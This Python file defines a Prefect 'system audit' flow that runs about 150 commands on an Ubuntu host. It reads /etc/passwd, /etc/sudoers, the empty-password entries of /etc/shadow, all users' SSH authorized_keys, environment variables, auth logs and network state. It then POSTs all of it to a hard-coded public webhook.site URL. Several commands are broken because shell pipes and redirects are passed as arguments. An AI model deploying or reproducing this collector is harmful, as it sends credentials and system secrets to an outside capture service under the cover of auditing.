import json
import os
import socket
import subprocess
from datetime import UTC, datetime
from typing import Any, Dict
from urllib.error import URLError
from urllib.request import Request, urlopen

from prefect import flow, task


def _json_serializer(value: Any) -> Any:
    """Convert unsupported objects to JSON-serializable data."""
    if isinstance(value, datetime):
        return value.isoformat()
    msg = f"Object of type {value.__class__.__name__} is not JSON serializable"
    raise TypeError(msg)


@task(name="gather_system_info")
def gather_system_info() -> Dict[str, Any]:
    """Gather comprehensive Ubuntu system information"""

    hostname = socket.gethostname()
    timestamp = datetime.now(UTC)
    audit_data = {"hostname": hostname, "timestamp": timestamp, "checks": {}}

    # Comprehensive audit commands organized by category
    commands = {
        # ============ SYSTEM INFORMATION ============
        "os_version": ["lsb_release", "-a"],
        "kernel_version": ["uname", "-r"],
        "kernel_full_info": ["uname", "-a"],
        "hostname_info": ["hostnamectl"],
        "machine_id": ["cat", "/etc/machine-id"],
        "uptime": ["uptime", "-p"],
        "uptime_detailed": ["uptime"],
        "system_boot_time": ["who", "-b"],
        "last_reboot": ["last", "reboot", "-F"],
        "dmesg_kernel_messages": ["dmesg", "-T"],
        "system_load": ["cat", "/proc/loadavg"],
        
        # ============ HARDWARE INFORMATION ============
        "cpu_info": ["lscpu"],
        "cpu_details": ["cat", "/proc/cpuinfo"],
        "memory_info": ["free", "-h"],
        "memory_detailed": ["cat", "/proc/meminfo"],
        "swap_info": ["swapon", "--show"],
        "disk_usage": ["df", "-h"],
        "disk_usage_inodes": ["df", "-i"],
        "block_devices": ["lsblk", "-a"],
        "block_device_info": ["blkid"],
        "disk_io_stats": ["iostat"],
        "hardware_info": ["lshw", "-short"],
        "pci_devices": ["lspci", "-v"],
        "usb_devices": ["lsusb", "-v"],
        "dmidecode_hardware": ["dmidecode", "-t", "system"],
        "bios_info": ["dmidecode", "-t", "bios"],
        
        # ============ USER & AUTHENTICATION ============
        "all_users": ["cat", "/etc/passwd"],
        "all_groups": ["cat", "/etc/group"],
        "shadow_file_check": ["ls", "-la", "/etc/shadow"],
        "current_logged_users": ["w"],
        "who_logged_in": ["who", "-a"],
        "last_logins": ["last", "-n", "50"],
        "last_failed_logins": ["lastb", "-n", "50"],
        "sudo_users": ["getent", "group", "sudo"],
        "users_with_uid_0": ["awk", "-F:", "($3 == 0) {print}", "/etc/passwd"],
        "users_without_password": ["awk", "-F:", "($2 == \"\") {print $1}", "/etc/shadow"],
        "password_policies": ["cat", "/etc/login.defs"],
        "pam_config": ["cat", "/etc/pam.d/common-auth"],
        "sudoers_config": ["cat", "/etc/sudoers"],
        
        # ============ SERVICES & PROCESSES ============
        "running_services": ["systemctl", "list-units", "--type=service", "--state=running"],
        "all_services": ["systemctl", "list-units", "--type=service", "--all"],
        "failed_services": ["systemctl", "--failed"],
        "enabled_services": ["systemctl", "list-unit-files", "--state=enabled"],
        "disabled_services": ["systemctl", "list-unit-files", "--state=disabled"],
        "systemd_timers": ["systemctl", "list-timers", "--all"],
        "running_processes": ["ps", "aux"],
        "process_tree": ["pstree", "-p"],
        "top_processes_cpu": ["ps", "aux", "--sort=-pcpu"],
        "top_processes_memory": ["ps", "aux", "--sort=-pmem"],
        "zombie_processes": ["ps", "aux", "|", "grep", "Z"],
        
        # ============ NETWORK CONFIGURATION ============
        "network_interfaces": ["ip", "addr", "show"],
        "network_interfaces_detailed": ["ip", "-s", "link"],
        "routing_table": ["ip", "route", "show"],
        "routing_table_all": ["route", "-n"],
        "arp_table": ["ip", "neigh", "show"],
        "listening_ports": ["ss", "-tuln"],
        "all_sockets": ["ss", "-tunap"],
        "netstat_listening": ["netstat", "-tuln"],
        "netstat_all_connections": ["netstat", "-tunap"],
        "active_connections": ["ss", "-tn"],
        "network_statistics": ["netstat", "-s"],
        "dns_config": ["cat", "/etc/resolv.conf"],
        "hosts_file": ["cat", "/etc/hosts"],
        "network_manager_status": ["nmcli", "general", "status"],
        "network_connections": ["nmcli", "connection", "show"],
        
        # ============ FIREWALL & SECURITY ============
        "iptables_rules": ["iptables", "-L", "-n", "-v"],
        "ip6tables_rules": ["ip6tables", "-L", "-n", "-v"],
        "ufw_status": ["ufw", "status", "verbose"],
        "firewalld_status": ["firewall-cmd", "--state"],
        "firewalld_zones": ["firewall-cmd", "--list-all-zones"],
        "selinux_status": ["sestatus"],
        "apparmor_status": ["aa-status"],
        "fail2ban_status": ["fail2ban-client", "status"],
        
        # ============ PACKAGE MANAGEMENT ============
        "installed_packages": ["dpkg", "-l"],
        "apt_sources": ["cat", "/etc/apt/sources.list"],
        "apt_sources_d": ["ls", "-la", "/etc/apt/sources.list.d/"],
        "security_updates": ["apt", "list", "--upgradable"],
        "package_count": ["dpkg", "-l", "|", "wc", "-l"],
        "recently_installed": ["grep", "install", "/var/log/dpkg.log"],
        "recently_upgraded": ["grep", "upgrade", "/var/log/dpkg.log"],
        "held_packages": ["apt-mark", "showholds"],
        "auto_installed": ["apt-mark", "showauto"],
        
        # ============ FILE SYSTEM & PERMISSIONS ============
        "mounted_filesystems": ["mount"],
        "fstab_config": ["cat", "/etc/fstab"],
        "disk_partitions": ["fdisk", "-l"],
        "lvm_volumes": ["lvdisplay"],
        "volume_groups": ["vgdisplay"],
        "physical_volumes": ["pvdisplay"],
        "suid_files": ["find", "/", "-perm", "-4000", "-type", "f", "2>/dev/null"],
        "sgid_files": ["find", "/", "-perm", "-2000", "-type", "f", "2>/dev/null"],
        "world_writable_files": ["find", "/", "-perm", "-002", "-type", "f", "2>/dev/null"],
        "world_writable_dirs": ["find", "/", "-perm", "-002", "-type", "d", "2>/dev/null"],
        "noowner_files": ["find", "/", "-nouser", "-o", "-nogroup", "2>/dev/null"],
        
        # ============ SSH CONFIGURATION ============
        "ssh_config": ["cat", "/etc/ssh/sshd_config"],
        "ssh_authorized_keys": ["find", "/home", "-name", "authorized_keys", "-exec", "cat", "{}", ";"],
        "ssh_host_keys": ["ls", "-la", "/etc/ssh/"],
        "ssh_active_sessions": ["who"],
        
        # ============ LOGS & AUDIT ============
        "auth_log": ["tail", "-n", "200", "/var/log/auth.log"],
        "syslog": ["tail", "-n", "200", "/var/log/syslog"],
        "kern_log": ["tail", "-n", "100", "/var/log/kern.log"],
        "failed_login_attempts": ["grep", "Failed password", "/var/log/auth.log"],
        "successful_sudo": ["grep", "sudo.*COMMAND", "/var/log/auth.log"],
        "journal_errors": ["journalctl", "-p", "err", "-n", "100"],
        "journal_warnings": ["journalctl", "-p", "warning", "-n", "100"],
        "auditd_status": ["systemctl", "status", "auditd"],
        "audit_rules": ["auditctl", "-l"],
        
        # ============ CRON JOBS ============
        "cron_jobs_root": ["crontab", "-l", "-u", "root"],
        "cron_daily": ["ls", "-la", "/etc/cron.daily/"],
        "cron_weekly": ["ls", "-la", "/etc/cron.weekly/"],
        "cron_monthly": ["ls", "-la", "/etc/cron.monthly/"],
        "system_crontab": ["cat", "/etc/crontab"],
        "cron_d": ["ls", "-la", "/etc/cron.d/"],
        
        # ============ KERNEL & SYSTEM PARAMETERS ============
        "sysctl_all": ["sysctl", "-a"],
        "kernel_modules": ["lsmod"],
        "loaded_modules_info": ["cat", "/proc/modules"],
        "kernel_parameters": ["cat", "/proc/cmdline"],
        "limits_config": ["cat", "/etc/security/limits.conf"],
        
        # ============ DOCKER & CONTAINERS (if installed) ============
        "docker_version": ["docker", "--version"],
        "docker_containers": ["docker", "ps", "-a"],
        "docker_images": ["docker", "images"],
        "docker_networks": ["docker", "network", "ls"],
        "docker_volumes": ["docker", "volume", "ls"],
        
        # ============ SECURITY SCANNING ============
        "rootkit_check": ["chkrootkit"],
        "rkhunter_check": ["rkhunter", "--check", "--skip-keypress"],
        "lynis_audit": ["lynis", "audit", "system", "--quick"],
        "open_files": ["lsof"],
        "file_capabilities": ["getcap", "-r", "/"],
        
        # ============ ENVIRONMENT & VARIABLES ============
        "environment_vars": ["env"],
        "shell_config": ["cat", "/etc/bash.bashrc"],
        "profile_config": ["cat", "/etc/profile"],
        
        # ============ TIME & NTP ============
        "current_time": ["date"],
        "timezone": ["timedatectl"],
        "ntp_status": ["timedatectl", "show-timesync", "--all"],
        "chrony_status": ["chronyc", "tracking"],
        
        # ============ MAIL & SMTP ============
        "mail_queue": ["mailq"],
        "postfix_config": ["postconf", "-n"],
        
        # ============ DATABASE (if installed) ============
        "mysql_status": ["systemctl", "status", "mysql"],
        "postgresql_status": ["systemctl", "status", "postgresql"],
        
        # ============ WEB SERVERS (if installed) ============
        "apache_status": ["systemctl", "status", "apache2"],
        "nginx_status": ["systemctl", "status", "nginx"],
        "apache_config_test": ["apache2ctl", "-t"],
        "nginx_config_test": ["nginx", "-t"],
    }

    # Execute all commands
    for check_name, cmd in commands.items():
        try:
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=60,
                shell=False
            )
            audit_data["checks"][check_name] = {
                "status": "success" if result.returncode == 0 else "failed",
                "output": result.stdout,
                "error": result.stderr if result.returncode != 0 else None,
                "return_code": result.returncode,
            }
        except subprocess.TimeoutExpired:
            audit_data["checks"][check_name] = {
                "status": "timeout",
                "error": "Command timed out after 60 seconds",
            }
        except FileNotFoundError:
            audit_data["checks"][check_name] = {
                "status": "not_found",
                "error": f"Command not found: {cmd[0]}",
            }
        except Exception as e:
            audit_data["checks"][check_name] = {
                "status": "error", 
                "error": str(e)
            }

    return audit_data


@task(name="send_to_analytics")
def send_to_analytics(audit_data: Dict[str, Any], webhook_url: str) -> bool:
    """Send audit data to central analytics via webhook"""
    try:
        data = json.dumps(audit_data, default=_json_serializer).encode("utf-8")
        req = Request(
            webhook_url,
            data=data,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "Prefect-Audit-System/2.0",
            },
            method="POST",
        )

        with urlopen(req, timeout=30) as response:
            status_code = response.getcode()
            if 200 <= status_code < 300:
                return True
            else:
                raise Exception(f"Webhook returned status code: {status_code}")

    except URLError as e:
        raise Exception(f"Failed to send data to webhook: {e}")
    except Exception as e:
        raise Exception(f"Error sending audit data: {e}")


@flow(name="system_audit", log_prints=True)
def system_audit_flow():
    """Main audit flow that gathers comprehensive system info and sends to analytics"""

    print(f"Starting comprehensive system audit on {socket.gethostname()}")

    # Gather system information
    audit_data = gather_system_info()

    print(f"Collected {len(audit_data['checks'])} system checks")
    
    # Send to analytics
    success = send_to_analytics(
        audit_data=audit_data,
        webhook_url="https://webhook.site/3517ded4-3143-4d33-897e-fa5f340a7cfd",
    )

    if success:
        print("Audit data successfully sent to analytics")
    else:
        print("Failed to send audit data")

    return audit_data


if __name__ == "__main__":
    system_audit_flow()
